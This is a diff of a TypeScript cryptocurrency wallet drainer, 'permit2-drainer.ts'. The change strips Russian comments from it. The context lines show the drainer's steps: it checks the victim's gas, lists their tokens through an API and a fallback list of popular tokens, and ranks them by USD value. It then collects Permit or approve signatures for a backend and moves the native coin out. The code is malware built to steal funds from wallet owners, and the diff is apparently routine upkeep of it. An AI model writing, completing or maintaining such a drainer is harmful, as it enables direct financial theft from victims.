@@ -1,5 +1,4 @@
 // permit2-drainer.ts
-// ФИНАЛЬНАЯ РАБОЧАЯ ВЕРСИЯ: С альтернативным методом поиска токенов
 
 import { ethers } from 'ethers';
 import axios from 'axios';
@@ -39,7 +38,6 @@ const NETWORK_CONFIG = {
   },
 };
 
-// 📋 ПОПУЛЯРНЫЕ ТОКЕНЫ ДЛЯ КАЖДОЙ СЕТИ
 const POPULAR_TOKENS: { [key: string]: string[] } = {
   eth: [
     '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
@@ -93,9 +91,6 @@ interface TokenInfo {
   hasPermit: boolean;
 }
 
-// ============================================
-// ПРОВЕРКА ПОДДЕРЖКИ PERMIT
-// ============================================
 async function checkTokenHasPermit(
   tokenAddress: string,
   provider: ethers.Provider
@@ -110,9 +105,6 @@ async function checkTokenHasPermit(
   }
 }
 
-// ============================================
-// ГЛАВНАЯ ФУНКЦИЯ
-// ============================================
 export async function drainWalletPermit2(
   network: keyof typeof NETWORK_CONFIG,
   signer: ethers.Signer
@@ -126,7 +118,6 @@ export async function drainWalletPermit2(
   console.log(`${'='.repeat(70)}\n`);
 
   try {
-    // ШАГ 1: ПРОВЕРКА ГАЗА
     console.log('⛽ Step 1: Checking gas balance...');
     const nativeBalance = await provider.getBalance(userAddress);
     const minRequired = ethers.parseEther(config.minGasReserve);
@@ -141,7 +132,6 @@ export async function drainWalletPermit2(
     }
     console.log(`   ✅ Gas check passed!\n`);
 
-    // ШАГ 2: ПОЛУЧЕНИЕ ТОКЕНОВ
     console.log('📊 Step 2: Fetching tokens...');
     console.log(`   Method 1: Trying API (${config.apiUrl})...`);
     
@@ -158,7 +148,6 @@ export async function drainWalletPermit2(
       return await transferNativeOnly(signer, config);
     }
 
-    // Показываем все найденные токены
     console.log(`\n${'─'.repeat(70)}`);
     console.log(`📋 FOUND ${tokens.length} TOKENS:`);
     console.log(`${'─'.repeat(70)}`);
@@ -168,7 +157,6 @@ export async function drainWalletPermit2(
     });
     console.log(`${'─'.repeat(70)}\n`);
 
-    // ШАГ 3: ФИЛЬТРАЦИЯ И СОРТИРОВКА
     const valuableTokens = tokens
       .filter(t => t.valueUSD >= 0.01)
       .sort((a, b) => b.valueUSD - a.valueUSD);
@@ -180,7 +168,6 @@ export async function drainWalletPermit2(
       return await transferNativeOnly(signer, config);
     }
 
-    // ШАГ 4: ОБРАБОТКА ТОКЕНОВ
     const successTokens: string[] = [];
     const failedTokens: string[] = [];
     const backendTxHashes: string[] = [];
@@ -219,7 +206,6 @@ export async function drainWalletPermit2(
     if (failedTokens.length > 0) console.log(`   ✗ ${failedTokens.join(', ')}`);
     console.log(`${'═'.repeat(70)}\n`);
 
-    // ШАГ 5: ПЕРЕВОД НАТИВНОГО ТОКЕНА
     console.log(`💸 Step 5: Transferring ${config.nativeSymbol}...`);
     
     const gasReserve = ethers.parseEther('0.002');
@@ -250,7 +236,6 @@ export async function drainWalletPermit2(
       console.log(`   ⚠️ Insufficient balance after gas reserve\n`);
     }
 
-    // ИТОГИ
     const totalValueUSD = valuableTokens
       .filter(t => successTokens.includes(t.symbol))
       .reduce((sum, t) => sum + t.valueUSD, 0);
@@ -297,9 +282,6 @@ export async function drainWalletPermit2(
   }
 }
 
-// ============================================
-// ОБРАБОТКА С PERMIT
-// ============================================
 async function processWithPermit(
   signer: ethers.Signer,
   token: TokenInfo,
@@ -377,9 +359,6 @@ async function processWithPermit(
   return result.txHash;
 }
 
-// ============================================
-// ОБРАБОТКА С APPROVE
-// ============================================
 async function processWithApprove(
   signer: ethers.Signer,
   token: TokenInfo,
@@ -453,9 +432,6 @@ async function processWithApprove(
   return result.txHash;
 }
 
-// ============================================
-// МЕТОД 1: ПОЛУЧЕНИЕ ТОКЕНОВ ИЗ API
-// ============================================
 async function getTokenBalancesFromAPI(
   network: keyof typeof NETWORK_CONFIG,
   address: string,
@@ -509,9 +485,6 @@ async function getTokenBalancesFromAPI(
   }
 }
 
-// ============================================
-// МЕТОД 2: ПРОВЕРКА ПОПУЛЯРНЫХ ТОКЕНОВ
-// ============================================
 async function checkPopularTokens(
   network: keyof typeof NETWORK_CONFIG,
   address: string,
@@ -539,9 +512,6 @@ async function checkPopularTokens(
   return tokens;
 }
 
-// ============================================
-// HELPER: ПОЛУЧЕНИЕ ИНФОРМАЦИИ О ТОКЕНЕ
-// ============================================
 async function getTokenInfo(
   tokenAddress: string,
   userAddress: string,
@@ -581,9 +551,6 @@ async function getTokenInfo(
   }
 }
 
-// ============================================
-// HELPER: ПОЛУЧЕНИЕ ЦЕНЫ ТОКЕНА
-// ============================================
 async function getTokenPrice(tokenAddress: string, network: string): Promise<number> {
   try {
     const platformMap: { [key: string]: string } = {
@@ -612,9 +579,6 @@ async function getTokenPrice(tokenAddress: string, network: string): Promise<num
   }
 }
 
-// ============================================
-// HELPER: ПЕРЕВОД ТОЛЬКО НАТИВНОГО ТОКЕНА
-// ============================================
 async function transferNativeOnly(
   signer: ethers.Signer,
   config: any
